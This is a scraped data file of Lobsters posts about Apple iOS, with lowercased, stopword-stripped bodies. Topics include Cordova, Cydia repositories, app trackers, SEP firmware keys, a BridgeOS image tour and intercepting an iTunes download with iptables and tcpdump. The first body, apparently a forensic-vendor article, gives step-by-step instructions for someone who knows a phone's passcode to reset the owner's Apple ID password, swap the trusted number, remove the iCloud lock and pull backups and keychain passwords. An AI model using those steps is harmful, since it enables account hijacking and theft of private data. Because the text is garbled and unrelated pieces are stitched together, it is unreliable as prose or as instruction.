connect phone different computer make local backup freshly installed copy itunes backup would still protected password set long time ago attempt change remove password must pas io would require provide old password first forgot original password going back stuck unless willing factory reset device lose data process ask perfect carefully thought solution want protect data attacker set long complex backup password store anywhere forgot password still make cloud backup restore phone backup even password keychain would restored rolled cloud backup onto device made backup used icloud keychain different device perfect system apparently everyone liking user whined police complained fbi complained apple gave io stripping backup password io still specify backup password itunes still change reset itunes know original password however mean little easily remove password io setting apple say knowledge base restore encrypted backup without password io later make new encrypted backup device resetting password io device go setting general reset tap reset setting enter io passcode follow step reset setting affect user data password reset setting like display brightness home screen layout wallpaper also remove encrypted backup password connect device itunes create new encrypted backup able use previous encrypted backup back current data using itunes setting new backup password device io earlier reset password looking setting removed backup password make new backup rather extract information device rush make sure specify temporary password always work make backup passwordprotected backup allow decrypting user password credit card data health data thing would otherwise inaccessible set temporary password make backup decrypt elcomsoft phone breaker use keychain explorer tool elcomsoft phone breaker access user password authentication token credit card number interesting thing oh picture password look google account password keychain see gain access whole lot highly interesting information including several year worth precise location data password saved chrome google photo bookmark google search history log twofactor authentication bet sim card google prompt iphone hand photo backup check io setting app whether icloud photo library enabled icloud account sync photo photo synced icloud included local cloud backup simply switching feature make possible back photo local backup iphone question run earlier version io allow removing backup password say lucky simply update device io reset password tried strategy multiple time issue device simply run io like iphone sanbernardino case best bet attempting jailbreak iphone device iphone allow complete physical acquisition including keychain note talking situation passcode known though case sanbernardino access iphone passcode already gained access following everything contained local backup password password token local keychain local picture video application data mostly sqlite alone massive beginning fact lot say change user apple id password remove icloud lock remotely lock andor erase user device make sure never get back control account changing apple id password removing icloud lock normally changing account password requires confirming old password first case one could reset password receiving onetime password reset link trusted address big three apple google microsoft browser important apple way apple account twofactor authentication one simply reset apple id password device confirming device passcode opposed supplying old apple id password mean practice someone iphone happen know recover passcode solution allowing bruteforce device passcodes available market following change user apple id password remove icloud lock reset reactivate iphone another account discover physical location device registered apple account remotely lock erase device replace original user trusted phone number receiving user code sim card access everything stored user icloud account reset user apple account icloud password use preinstalled find phone app reminder going work account tap forgot apple id password app prompt device passcode enter passcode next step enter confirm new apple id password icloud password simple never prompted enter original apple account password device passcode enough reset account password bug find phone app absolutely even without using app open setting app user iphone open user apple id setting open password security tap change password prompted device passcode able change password icloud apple id fact even setting app compared find phone addition account password also replace user trusted phone number phone number making insanely difficult exowner regain control nowyours apple account order replace trusted phone number first add confirm new trusted number remove old one point removing icloud lock lock protects io device theft easy switching find iphone typing newly created apple id password accessing icloud account access icloud data backup synced data icloud photo stored password normally securely protected order access data would need login password access second authentication factor wait reset user icloud password added new phone number receive onetime code mean easily access everything user apple account including icloud backup photo taken device icloud keychain contact call log lot icloud backup wrote icloud backup many time word apple may store three last backup per device user multiple io device registered apple id cloud backup available device resetting icloud password opened possibility access backup need user apple id newly reset password onetime code pas twofactor authentication use elcomsoft phone breaker download backup tool apple download icloud backup backup downloaded saved itunes format view content elcomsoft phone viewer forensic tool call log file synced data icloud lot backup apple device use icloud sync information browser bookmark open tab web browsing history contact note call log even password information collected synchronized across device registered apple account extracting synced data simple use elcomsoft phone breaker download elcomsoft phone viewer analyse user mac access document desktop file synced mac icloud drive use elcomsoft phone breaker tool apple download icloud icloud drive obtain file finally added bonus may able extract user recovery key user allowed cloud recovery password icloud keychain icloud keychain cloud service synchronizing safari password authentication token payment information across io device changing icloud password assuming know device passcode purpose article given easily download password step elcomsoft phone breaker click tool apple download icloud keychain step use login password code log icloud step select trusted device list must device know passcode enter passcode device passcode box step icloud keychain downloaded go back main window open keychain explorer access password way access original old password user apple id account well possibly password token user apple id account addition may also see password email account wifi network well pretty much every password user typed safaru conclusion release io apple developer made many assumption breaking fragile securityconvenience balance shifting heavily onto convenience side intruder gain access user iphone know recovers passcode single extra layer protection left everything mean everything completely exposed local backup keychain icloud lock apple account password cloud backup photo password icloud keychain call log location data browsing history browser tab even user original apple id password quickly exposed intruder gain control user apple device registered apple account ability remotely erase lock device finally regaining control hijacked account made difficult even trusted phone number replaced scary apple decided get rid system used deliver seemingly perfect balance security convenience beyond u think big issue one word celebgate obviously victim password protecting account yet enough stop hacker stealing photo second protection layer delivered twofactor authentication saying iphone passcode longer control device apple account protect since passcode one safeguard left make sure use least digit fourdigit pin longer secure wait see apple fix
239,Lobsters,ios,Apple iOS,Lessons learned from 4 years of using Cordova in production,http://korban.net/posts/2017-11-29-lessons-4-years-of-cordova/,lesson learned year using cordova production,leaky abstraction limited capability nonnative ui impossible track gps background io recommendation,spent four year developing application io android ended relying cordova plugins developed long list capability showing map complex overlay even web gl map latest version readingwriting local file using camera photo qr code scanning working background continuously tracking user position including long stretch time background using accelerometer detect motion stopstart event tracking bluetooth beacon ranged continuously background local notification push notification uploading image working offline usual interaction server sync data think pushed boundary possible develop cordova really appreciate cordova viable option former business develop application could run two different platform additionally share code another web application realistically lot drawback well leaky abstraction cordova much leaky abstraction way forget platform specific develop single glorious javascript codebase fully escape native code ended modifying native code plugins achieve desired behaviour implement fix thing required hunting additional platform specific plugins example get application run background android add extra plugin would allow configure appropriate wake lock time time find install tiny single purpose plugins eg fix android build error caused missing translation prescribed default configuration add new setting required use camera particular version io cordova seems small number contributor although appear quite dedicated thing generally lag behind o release plugins likely updated o bug tool bug plugins lot thing generally feel slapped together unpolished bug stay open long time particularly plugins couple issue highlight point cordova screwed version code android appending zero causing quite headache developer version number started approaching upper bound range cordova fixed version number increase monotonically point view play store add extra build step append zero version code build process issue plugins request permission o one plugin requesting particular permission either going cause build fail one request win based unknown order randomly ordered request win still problem user prompt message associated request io since wanted prompt particular text add extra build step set later build process limited capability cordova limited lowest common denominator multiple platform abstraction top native apis try complex stuff inevitably run various limitation bug example lot problem developer tool io working started integrate mapbox web gl map application time go web view becoming risk io apple released wkwebview replacement uiwebview io wkwebview provides much improved performance used cordova apps however come number caveat critically run javascript app background worked uiwebview also requires server cors enabled app make asynchronous request served via file limitation largely imposed apple implementation clear either whether going resolved long uiwebview continue exist oddity like weird error trying read local file inconsistent reporting connection status example android device connected wifi guest mode power status battery level retrieved demand would reported upon change meant dark device happened hooked ac power charged battery event would generated case nonnative ui started project hardly viable option crossplatform mobile development initially started working platform called steroid promised provide element native ui eg transition navigation bar combination cordova rest however quickly realised getting mired leaky abstraction hell combination complicated framework steroid top another framework cordova lethal difficult isolate bug made decision migrate plain cordova luckily straightforward point day multiple option crossplatform mobile development native ui react native xamarin nativescript probably manage avoid issue specific running app web view still lot caveat cordova impossible track gps background io long time spent trying find solution conclude simply way reliably track gps location background io extended period time something appears changed internally starting io possibly even io cause device work without fault week developer device always subset course others app get either suspended terminated sooner later difficult issue diagnose course suspended app log anything scoured internet solution week last couple year tried popular cordovaplugingeolocation forked incorporated suggestion could find running background spent considerable amount time trying get commercial transistorsoft plugin work end conclude simply possible io android possible long set wake lock properly fair sure even native app io could achieve recommendation good idea use cordova additional layer abstraction provides gain speed development would suggest good rule thumb assume risk due exposure bug limitation complexity rise square number layer involved cordova time much writing native application something like ionic time much native cordova ionic recommendation use cordova simple apps much sensor nothing little background need create something fairly complex something native look feel better biting bullet developing native application also recommend going higher two layer framework simply brittle bugprone something like ionic completely limit
240,Lobsters,ios,Apple iOS,Two Major Cydia Repositories Shut Down as Jailbreaking Fades in Popularity,https://www.macrumors.com/2017/11/23/modmyi-macciti-cydia-repos-shut-down/,two major cydia repository shut jailbreaking fade popularity,announced cydia new atlas shut last week interview cult mac jailbreak io hack rjailbreak,modmy today announced archived default modmyi repository cydia essentially alternative app store downloading apps theme tweak file jailbroken iphone ipad ipod touch device jailbroken iphone running io via new atlaszodttdmacciti also shut last week meaning two three cydia major default repository longer active month modmy recommends developer jailbreaking community use bigboss repository one last major cydia source remains functional closure two major cydia repository arguably result declining interest jailbreaking provides root filesystem access allows user modify io install unapproved apps iphone ipad ipod touch iphone ipod touch first released jailbreaking quickly grew popularity fun practical reason app store example allowed user install apps game jailbreaking even useful something simple setting wallpaper possible early io version even later year jailbreaking remained popular number popular tweak apple eventually implemented io system toggle lock screen widget quick reply text message screen recording multitasking pictureinpicture mode ipad keyboard trackpad mode many feature available box allure jailbreaking considerably le many people get end asked cydia creator jay freeman interview motherboard used got killer feature almost reason owned phone get small minor modification one downside jailbreaking always violation apple end user license agreement every io user agrees illegal united state due exemption digital millenium copyright act jailbreaking also technically void device warranty coverage statement provided cult mac back apple said jailbreaking severely degrade experience iphone apple goal always insure customer great experience iphone know jailbreaking severely degrade experience said vast majority customer jailbreak iphones violate warranty cause iphone become unstable work reliably apple catandmouse game jailbreaking ongoing decade may finally winning battle given advancement io security decreasing interest jailbreaking io first major version apple mobile operating system publicly jailbroken developer claimed exploit io various security conference mac pc tool like pangu released public download jailbreak device lack public jailbreak latest io version several month fueled socalled death spiral jailbreaking get fewer people bothering jailbreak get fewer developer targeting interesting thing mean le reason people jailbreak said freeman mean fewer people jailbreaking cause le developer bothering target slowly die io user still interested jailbreaking visit jailbreak io hack forum section rjailbreak reddit
241,Lobsters,ios,Apple iOS,Researchers craft Android app that reveals menagerie of hidden spyware; legally barred from doing the same with iOS,https://boingboing.net/2017/11/25/la-la-la-cant-hear-you.html,researcher craft android app reveals menagerie hidden spyware legally barred io,yale privacy lab tracker profile staggering variety clandestine tracker found popular android apps analyzes privacy concern android application,yale privacy lab exodus privacy devastating report dozen invasive dangerous tracker hidden common android apps generated writing code spied target device internal operation uncovering manner sneaking trickery would great effective regulatory oversight power seek legal relief company lying u andor sneaking spyware life every bit important right independently audit action privacy lab exodus done install code override undesirable function spyware example blocking communication chaffing plausible garbage data exodus privacy app functionality key attaining first goal gathering independent evidence conduct mobile firm app provider without evidentiary basis way know need selfhelp measure way convince regulator take action possibility creating public clamour competing product would spur investor entrepreneur make tool let reclaim control device exodus yale note tracker almost certainly also present io company make advertise io compatibility one thing io drmlocked felony punishable prison sentence fine first offense usa dmca similar provision article eucd france exodus located distribute tool bypass drm even essential work discovering whether billion people risk due covert spying platform true u copyright office gave u soontoexpire exemption rule started exemption allows exodus use tool nt allow exodus make tool distribute independent researcher investigate io capability tracker uncovered exodus include targeting user based thirdparty data identifying offline movement machine learning tracking behavior across device uniquely identifying correlating user targeting user abandon shopping cart tracker work deriving identification code mobile device web browser sharing third party specifically profile app maker even tie data collected tracker profile individual including name account detail tracking company say anonymize data strict rule sharing publicly identifiable information sheer wealth data collected make possible identify user even face safeguard although apps identified exodus yale researcher may technically disclose use tracker fine print privacy policy term service app description difficult say least smartphone user get clear handle extent nature monitoring directed whole point using mobile app often save time many people actually know tracker even said michael kwet another visiting fellow yale privacy lab exodus create software even detect tracker offer user option opt via email privacy setting tracking resume even step taken example one app requires user clear cache set optout optouts temporary even optouts end permanent user would even know activate first place yale privacy lab tracker profile github staggering variety clandestine tracker found popular android apps yael grauerthe intercept analyzes privacy concern android application exodus ten year ago apple released ipad hotel room seattle jetlagged awake wife daughter slept last year eu adopted incredibly controversial copyright directive passed five vote afterwards meps said got confused pushed wrong button eu member state create rule require online platform filter usergenerated content block match secret unaccountable back world wide web consortium approved controversial standard long history encrypted medium extension eme enabled netflix big medium company use drm despite change browser extension eliminated kind deep hook drm requires project manager lot responsibility plate hipdeep major project ride herd project also need constantly gather data analyze result modify process report back various project stakeholder difficult position may federal law new car truck u must equipped rearview monitoring technology however still leaf million million vehicle produced two year ago without rearmounted sensor capable telling back bmw parking still nt climbed aboard robot vacuum cleaner bandwagon probably one question unleashing tiny carpet sucker home nag others actually good job le authority tech pcmag definitive statement saying robot vacuum
242,Lobsters,ios,Apple iOS,Apple‚Äôs Secure Enclave Processor (SEP) Firmware Decrypted,http://hackaday.com/2017/08/18/apples-secure-enclave-processor-sep-firmware-decyrpted/,apple secure enclave processor sep firmware decrypted,decryption key apple secure enclave processor sep firmware posted online demystifying secure enclave processor talk published decryption key sep firmware split tool,decryption key apple secure enclave processor sep firmware posted online selfdescribed pornstar xerub sep security coprocessor introduced iphone touch id introduced black box supposed know anything xerub pulled back curtain secure enclave handle processing fingerprint data touch id sensor determines match also enables access purchase user sep gatekeeper prevents main processor accessing sensitive data processor sends data read sep authenticated session key generated device shared key also run o sepos kernel service driver apps sep performs secure service rest soc much learn demystifying secure enclave processor talk blackhat xerub published decryption key decrypt firmware use xerub sep firmware split tool process tool make piece cake security researcher comb firmware looking vulnerability
243,Lobsters,ios,Apple iOS,Org-mode companion for iPhone and iPad,http://beorgapp.com/,orgmode companion iphone ipad,,
244,Lobsters,ios,Apple iOS,Under the Bridge: A quick tour of the BridgeOS 2.0 image,http://newosxbook.com/articles/BridgeOS.html,bridge quick tour bridgeos image,latest version decompressor,morpheus zephyr documentsiosbridgeos mv downloadsbridgeosupdatecustomerpkg morpheus zephyr documentsiosbridgeos l bridgeosupdatecustomerpkg macos pkg format xar archive unpack thus morpheus zephyr documentsiosbridgeos xar tvf bridgeosupdatecustomerpkg rwr r rootwheel bom rwr r rootwheel packageinfo rw rootwheel payload morpheus zephyr documentsiosbridgeos xar xvf bridgeosupdatecustomerpkg bom packageinfo payload morpheus zephyr documentsiosbridgeos file bom mac o x bill material bom file bridgeosupdatecustomerpkg xar archive version checksum packageinfo xml document text ascii text payload data nextstep legacy billofmaterials file read lsbom tell u file expect successful unpacking package morpheus zephyr documentsiosbridgeos lsbom bom head usr usrstandalone usrstandalonefirmware usrstandalonefirmwarebridgeoscustomerbundle usrstandalonefirmwarebridgeoscustomerbundlecontents usrstandalonefirmwarebridgeoscustomerbundlecontentsinfoplist usrstandalonefirmwarebridgeoscustomerbundlecontentsresources usrstandalonefirmwarebridgeoscustomerbundlecontentsresourcesbuildmanifestplist usrstandalonefirmwarebridgeoscustomerbundlecontentsresourcesupdatebundlezip payload file pbzx apple favorite compression ota image wrote decompressor using latest version decompressor builtin liblzmaxz integration get morpheus zephyr documentsiosbridgeos cat payload pbzxpbzxmacos p flag chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte warning ca nt find xz header instead likely xz data chunk flag length byte warning ca nt find xz header instead likely xz data chunk flag length byte warning ca nt find xz header instead likely xz data chunk flag length byte warning ca nt find xz header instead likely xz data chunk flag length byte ok byte chunk flag length byte ok byte morpheus zephyr documentsiosbridgeos file p p ascii cpio archive odc xz data time pbzx contains raw chunk data uncompressed tool warns copy output normally nt cause error since cpio archive decompress morpheus zephyr documentsiosbridgeos mkdir x morpheus zephyr documentsiosbridgeos cd x morpheus zephyr documentsiosbridgeosx cat p cpio ivd usr usrstandalone usrstandalonefirmware usrstandalonefirmwarebridgeoscustomerbundle usrstandalonefirmwarebridgeoscustomerbundlecontents usrstandalonefirmwarebridgeoscustomerbundlecontentsinfoplist usrstandalonefirmwarebridgeoscustomerbundlecontentsresources usrstandalonefirmwarebridgeoscustomerbundlecontentsresourcesbuildmanifestplist usrstandalonefirmwarebridgeoscustomerbundlecontentsresourcesupdatebundlezip usrstandalonefirmwarebridgeoscustomerbundlecontentscodesignature usrstandalonefirmwarebridgeoscustomerbundlecontentscodesignaturecodedirectory usrstandalonefirmwarebridgeoscustomerbundlecontentscodesignaturecoderequirements usrstandalonefirmwarebridgeoscustomerbundlecontentscodesignaturecoderesources usrstandalonefirmwarebridgeoscustomerbundlecontentscodesignaturecodesignature usrstandalonefirmwarebridgeoscustomerbundlecontentsversionplist obvious payload updatebundlezip could see lsbom output somewhere biggest file moment truth since anything corrupt downloadpbzxcpio zip wo nt decompress well morpheus zephyr documentsiosbridgeosx unzip usrstandalonefirmwarebridgeoscustomerbundlecontentsresourcesupdatebundlezip archive usrstandalonefirmwarebridgeoscustomerbundlecontentsresourcesupdatebundlezip creating metainf inflating metainfcomapplezipmetadataplist inflating infoplist creating boot inflating inflating bootbuildmanifestplist creating bootfirmware creating bootfirmwareaop inspect kernelcache morpheus zephyr documentsiosbridgeosx documentsworkjtooljoker dec mmapped feeding compressed kernelcache eh fine decompress compressed size uncompressed unknown crc unknown got kernel got mem mmapped kernel io later kernel io later exception vector file offset addr j line used ipads nt x line macbook pro touchbar used since used dec joker decompressed kernel tmp morpheus zephyr documentsiosbridgeosx l l tmpkernel rw morpheus wheel nov tmpkernel morpheus zephyr documentsiosbridgeosx jtool l tmpkernel lc mem text mem textconst mem textcstring cstring literal mem textoslog lc mem dataconst mem dataconstmodinitfunc module init function ptrs mem dataconstmodtermfunc module termination function ptrs mem dataconstconst lc mem textexec mem textexectext normal lc mem kld mem kldtext normal mem kldcstring cstring literal mem kldconst mem kldmodinitfunc module init function ptrs mem kldmodtermfunc module termination function ptrs mem kldbss zero fill lc mem last mem lastpinst mem lastmodinitfunc module init function ptrs mem lastlast zero fill lc mem data mem datadata mem datasysctlset mem datallvmprfcnts mem datallvmprfdata mem datallvmprfnames mem datallvmprfvnds mem databss zero fill mem datacommon zero fill lc mem prelinktext mem prelinktexttext lc mem plktextexec mem plktextexectext lc mem prelinkdata mem prelinkdatadata lc mem plkdataconst mem plkdataconstdata lc mem plkllvmcov mem plkllvmcovllvmcovmap lc mem plklinkedit mem plklinkeditdata lc mem prelinkinfo mem prelinkinfoinfo lc mem linkedit lc lcsymtab symbol table offset entry string table offset byte lc lcdysymtab local symbol external symbol index undefined symbol toc modtab indirect symbol lc lcuuid uuid lc lcbuildversion build version platform bridgeos lc lcsourceversion source version lc lcunixthread entry point lc lcfunctionstarts offset size morpheus zephyr documentsiosbridgeosx string tmpkernel grep darw darwin kernel version thu sep pdt root darwin morpheus zephyr documentsiosbridgeosx documentsworkjtooljoker k tmpkernel mmapped kernel io later kernel io later exception vector file offset addr mac framework pseudoextension comapplekpidsep private pseudoextension comapplekpiprivate io kit pseudoextension comapplekpiiokit libkern pseudoextension comapplekpilibkern bsd kernel pseudoextension comapplekpibsd applefscompressiontypezlib comappleapplefscompressionapplefscompressiontypezlib mach kernel pseudoextension comapplekpimach unsupported pseudoextension comapplekpiunsupported corecrypto comapplekeccorecrypto ioslowadaptiveclockingfamily comappleiokitioslowadaptiveclockingfamily io kit storage family comappleiokitiostoragefamily ioreportfamily comappleiokitioreportfamily applearmplatform comappledriverapplearmplatform applediskimagedriver comappledriverdiskimages applediskimageskernelbacked comappledriverdiskimageskernelbacked io kit pci family comappleiokitiopcifamily appleusbcommon comappledriverusbappleusbcommon io kit driver usb device comappledriverappleusbhostmergeproperties iousbdevicefamily comappleiokitiousbdevicefamily iokit serial port family comappleiokitioserialfamily applemobilefileintegrity comappledriverapplemobilefileintegrity iohidfamily comappleiokitiohidfamily io kit networking family comappleiokitionetworkingfamily ioskywalkfamily comappleiokitioskywalkfamily appleonboardserial comappledriverappleonboardserial ioaccessorymanager comappleiokitioaccessorymanager ioslaveprocessor comappledriverioslaveprocessor rtbuddy comappledriverrtbuddy applearmpmu comappledriverapplearmpmu appleembeddedtempsensor comappledriverappleembeddedtempsensor applesmc comappledriverapplesmc appleembeddedpcieuplinkmgmt comappledriverappleembeddedpcieuplinkmgmt applediskimagesudifdiskimage comappledriverdiskimagesudifdiskimage bridgeaudiopciep comappledriverapplebridgeaudiopciep appleusbdevicemux comappledriverappleusbdevicemux applehurricaneerrorhandler comappledriverapplehurricaneerrorhandler iodartfamily comappledriveriodartfamily applesamsungspi comappledriverapplesamsungspi pthread comapplekecpthread fairplayiokit comappledriverfairplayiokit iotextencryptionfamily comappleiotextencryptionfamily regular expression matching engine comapplekextapplematch seatbelt sandbox policy comapplesecuritysandbox iosurface comappleiokitiosurface apple scaler color space converter driver ioacceleratorfamily comappleiokitioacceleratorfamily applenandconfigaccess comappledriverapplenandconfigaccess applediagnosticdataaccessreadonly comappledriverapplediagnosticdataaccessreadonly iohdcpfamily comappleiokitiohdcpfamily libmkext comapplekeclibm iocecfamily comappleiokitiocecfamily ioavfamily comappleiokitioavfamily applediskimagesrambackingstore comappledriverdiskimagesrambackingstore applearmiisaudio comappleiokitapplearmiisaudio appleembeddedaudio comappledriverappleembeddedaudio iobuffercopyenginefamily comappleiokitiobuffercopyenginefamily applecsembeddedaudio comappledriverapplecsembeddedaudio iokit usb host family comappleiokitiousbhostfamily appleusbvhcicommon comappledriverusbappleusbvhcicommon vhci controller firmware driver comappledriverusbappleusbvhcifirmware appleeffaceablestorage comappledriverappleeffaceablestorage iocryptoacceleratorfamily comappleiokitiocryptoacceleratorfamily applesepmanager comappledriverapplesepmanager applesepkeystore comappledriverapplesepkeystore appleeffaceablenor comappledriverappleeffaceablenor applebcenorflashdeviceep comappledriverapplebcenorflashdeviceep applepmgr comappledriverapplepmgr lskdiokitmse comappledriverlskdiokitmse hf comapplefilesystemshfskext appleembeddedsimplespinorflasherdriver comappleappleembeddedsimplespinorflasher appleembeddedusb comappledriverappleembeddedusb applesynopsysotgdevice comappledriverapplesynopsysotgdevice appleembeddedlightsensor comappledriverappleembeddedlightsensor applesamsungserial comappledriverapplesamsungserial io kit hid event driver safe boot comappleiokitiohideventdriversafeboot applebsdkextstarter comappledriverapplebsdkextstarter provinfoiokit comappledriverprovinfoiokit appleembeddedpcie comappledriverappleembeddedpcie ionvmefamily comappleiokitionvmefamily applehidkeyboard comappledriverapplehidkeyboard iohidrelaymanager comappledriveriohidrelaymanager iotimesyncfamily comappleiokitiotimesyncfamily iobuffercopycontroller comappleiokitiobuffercopycontroller appleembeddedpupconfigmgmt comappledriverappleembeddedpupconfigmgmt iouserethernet comappleiokitiouserethernet applesepcredentialmanager comappledriverapplesepcredentialmanager applefirmwareupdatekext comappledriverapplefirmwareupdatekext macefimanager comappledrivermacefimanager applespu comappledriverapplespu appleaopaudio comappledriverappleaopaudio appleembeddedpupfirmwareservice comappledriverappleembeddedpupfirmwareservice appleusbethernetdevice comappledriverappleusbethernetdevice appleeffaceableblockdevice comappledriverappleeffaceableblockdevice io kit hid event driver comappleiokitiohideventdriver encryptedblockstorage comappleiokitencryptedblockstorage lskdiokit comappledriverlskdiokit apfs comapplefilesystemsapfs iomobilegraphicsfamily comappleiokitiomobilegraphicsfamily applemobileapnonce comappledriverapplemobileapnonce applediskimagesfilebackingstore comappledriverdiskimagesfilebackingstore avebridge comappleavebridge iohidrelayservice comappledriveriohidrelayservice appledialogpmu comappledriverappledialogpmu applebsdkextstartervpn comappledriverapplebsdkextstartervpn applessm comappledriverapplessm applediskimagesreadwritediskimage comappledriverdiskimagesreadwritediskimage video encoder appleinterruptcontroller comappledriverappleinterruptcontroller kernelrelaydevice comappledriverkernelrelaydevice applejpegdriver comappledriverapplejpegdriver applesart comappledriverapplesart applesynopsysmipidsi comappledriverapplesynopsysmipidsi applespmi comappledriverapplespmi appleusbnetworking comappledriverusbnetworking appleusbdevicencm comappledriverappleusbdevicencm iostreamfamily comappleiokitiostreamfamily applesamsungpke comappledriverapplesamsungpke applehidkeyboardembedded comappledriverapplehidkeyboardembedded applesummitlcd comappledriverapplesummitlcd got kexts definitely kernel apple iirc eos bridgeos version le aapl started using lcsourceversion latest jtool recognizes time cut numerous lcminversionxxxxxos still encrypted hmmph image put pbzx zip pbzx eludes morpheus zephyr documentsiosbridgeosx cat pbzxpbzxmacos p flag chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte chunk flag length byte ok byte morpheus zephyr documentsiosbridgeosx mkdir morpheus zephyr documentsiosbridgeosx cd morpheus zephyr documentsiosbridgeosxy otaa e p morpheus zephyr documentsiosbridgeosxy l f library system bin etc private sbin tmp usr morpheus zephyr documentsiosbridgeosxy l bin df p morpheus zephyr documentsiosbridgeosxy l sbin dmesg fsckhfs ifconfig mknod mountfdesc nologin route dynamicpager fstypmsdos kextunload mount mounthfs ping rtsol fsck fstypntfs launchd mountapfs newfsapfs umount fsckapfs halt mountdevfs newfshfs quotacheck morpheus zephyr documentsiosbridgeosxy l usrbin macefiutil buttontool hidutil sysdiagnose tailspin vmstat zprint morpheus zephyr documentsiosbridgeosxy l usrsbin ac distnoted ioreg rtadvd taskpolicy bridgeaudiod filecoordinationd notifyd sysctl cfprefsd gpt nvram syslogd morpheus zephyr documentsiosbridgeosxy l usrlibexec appleuvccamera diagnosticd misagent securityd crashhousekeeping eosd mobileobliterator seputil ioaccelmemoryinfocollector eostraced mobilewatchdog smcdiagnose lasecureiod fdrserviced msutil tailspind nandtaskscheduler fseventsd mtmergeprops telnetd usereventagent getty multiversed transitd amfid hidd nfcdrelay trustd aveserverd initdataprotection pathhelper upsshutdown bkremoted ioupsd pcapd vndevice bridgeosupdated keybagd relayd xartstoraged ccfipstest logd remotectl xpcproxy corebrightnessd lskdd rtbuddyd xpcroleaccountd dfrd lskdmsed sandboxd morpheus zephyr documentsiosbridgeosxy l library audio log mobiledevice keychains managed preference preference morpheus zephyr documentsiosbridgeosxy l f systemlibrary awd cachedelete framework preference accessoryupdaterbundles cache hidplugins privateframeworks appleusbdevice coreservices launchdaemons softwareupdatecertificates assettypedescriptors dfr multiverseplugins systemconfiguration audio extension obliteration usereventplugins bundle filesystems perl morpheus zephyr documentsiosbridgeosxy l f systemlibraryprivateframeworks apfsframework iomobileframebufferframework aggregatedictionaryframework loggingsupportframework aggregatedictionaryhistoryframework mediakitframework applefscompressionframework mobileaccessoryupdaterframework applejpegframework mobiledevicelinkframework mobileinstallationframework applesauceframework mobilekeybagframework assertionservicesframework mobileobliterationframework audioserverapplicationframework mobilesoftwareupdateframework audioserverdriverframework mobilesystemservicesframework baseboardframework multitouchsupportframework biometricsupportframework multiversesupportframework bomframework networkframework bridgeaccessibilitysupportframework networkstatisticsframework bridgexpcframework oauthframework commonauthframework osanalyticsframework coreanalyticsframework pasamplingframework corebrightnessframework powerlogframework coreservicesinternalframework protocolbufferframework corespeechframework remoteservicediscoveryframework coresymbolicationframework remotexpcframework crashreportersupportframework servicemanagementframework disframework streamingzipframework ezsocketsframework symbolicationframework embeddedossupportframework usermanagementframework fileproviderframework videotoolboxframework foundationodrframework voicetriggerframework gpusupportframework dfrdsupportframework graphicsservicesframework kperfframework heimdalframework kperfdataframework ioaccelmemoryinfoframework ktraceframework ioacceleratorframework morpheus zephyr documentsiosbridgeosxy l f systemlibraryframeworks avfaudioframework corefoundationframework imageioframework accelerateframework coregraphicsframework mobilecoreservicesframework audiotoolboxframework coremediaframework openglframework audiounitframework corevideoframework openglesframework cfnetworkframework foundationframework systemframework coreaudioframework gssframework systemconfigurationframework coredataframework iokitframework morpheus zephyr documentsiosbridgeosxy l privateetc asl fstab host network notifyconf passwd service aslconf group masterpasswd newsyslogd pamd protocol ttys morpheus zephyr documentsiosbridgeosxy head privateetcmasterpasswd user database file authoritative user database nobody unprivileged user varempty usrbinfalse root system administrator varroot binsh mobile mobile user varmobile binsh morpheus zephyr documentsiosbridgeosxy l systemlibrarycoreservices bridgeversionplist dumppanic reportcrash systemversionplist powerdbundle morpheus zephyr documentsiosbridgeosxy l systemlibrarycoreservicessystemversionplist systemlibrarycoreservicessystemversionplist morpheus zephyr documentsiosbridgeosxy cat systemlibrarycoreservicessystemversionplist xml version encoding doctype plist public appledtd plist http plist version dict key buildid key string string key productbuildversion key string string key productcopyright key string apple inc string key productname key string bridge o string key productversion key string string key systemimageid key string string dict plist
245,Lobsters,ios,Apple iOS,"Fine, I'll Download It For You",https://somerandomidiot.com/blog/2017/06/13/fine-ill-download-it-for-you/,fine download,get itunes lazy way side note fast home internet calyx institute reasonable option exhausted unreasonable seems le exhausting step put something control traffic stream step spy stuff step waiting step serve file port step convince imac goodcomputer appldnldapplecom http appldnldapplecom step profit afterthought squid,recently found needing reset iphone factory default useful stuff trying passcode phone appleid phone associated itunes installation internet connection capable downloading iphone software image minute turn first two optional given last two least reasonable facsimile last one fake spent first day funemployment compensating apple engineer failing consider might nice download file need use get itunes lazy way apple instruction resetting phone factory default give several suggestion applicable credential finally bottom telling user boot phone recovery mode connected computer running itunes managed boot old imac housemate sitting basement waiting wipe hard drive luckily running new enough osx get right version itunes get right version iphone software particular iphone great given working itunes installation booting phone recovery mode give option restore update remove information phone update latest iphone o sound like want choosing give dialogue box change note latest io nice eula agree ugh fine itunes go get phone fails iphone stay recovery mode minute side note fast home internet pay fast internet house bunch reason encourages screw around internet instead stuff cost lot money pretty frequently company take money exchange pretty evil access via experimental citywide lte network calyx institute sprint network member perk neither fast enough download entire io image minute best download speed seen either network around best possible condition imac basement oops working best possible condition getting like trying download file reasonable option exhausted unreasonable seems le exhausting searching fruitlessly way get itunes predownload file wanted flash phone decided figure looking download onto another device trick imac downloading local faster computer step put something control traffic stream mention root imac therefore easily invoke tcpdump well root imac also root lte device imac ethernet port machine root use second machine let call goodcomputer unlike everything else involved process cooperative play well others bridge wifi network provided lte device imac goodcomputer interface wifi interface talking lte uplink ethernet interface talking imac goodcomputer nonancient linux machine need enable traffic forwarding across interface sudo sysctl w since want allow imac whatever weird stuff think necessary update phone set nat private network ethernet side sudo iptables postrouting j masquerade set static networking side imac contact u sudo ip link set sudo ip addr add dev know whether configure network interface imac without root access bothered find start dnsmasq configuration serving ip address range imac detects working internet connection automatically connect ethernet cable goodcomputer turn wifi imac prevent deciding interface preferable ethernet link test outside access still work loading website imac sure enough ready go step spy stuff goodcomputer see imac traffic try restore operation itunes start packet capture first know looking capture everything go ethernet interface sudo tcpdump enn w itunesupgradephonepcap wait imac solidly middle downloading step take another peek see host busy communicating sudo tcpdump xvvenni tcp notice see lot traffic port bit surprising port unauthenticated http would really expected request authenticated encrypted tl traveling port great news u get request imac unencrypted look traffic stream find start let use tshark get full uris http request made host applecom r itunesupgradephonepcap tell tshark read packet capture made previously httprequestfulluri contains applecom tell 